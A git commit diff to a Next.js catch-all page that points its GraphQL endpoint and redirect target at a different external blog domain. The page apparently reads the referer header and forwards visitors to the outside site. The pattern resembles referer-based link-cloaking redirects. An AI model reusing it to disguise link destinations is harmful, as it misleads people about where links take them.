df36d9ee6c0565f79a2d43e91d77bc072bb1213b
siscoassery23 <163540365+siscoassery23@users.noreply.github.com>
2024-10-05 00:11:52 +0300

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://beautfulify.xyz/graphql"
+	const endpoint = "https://lifeeducation.blog/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://beautfulify.xyz/` + encodeURI(path as string)
+					`https://lifeeducation.blog/` + encodeURI(path as string)
 				}`,
 			},
 		};
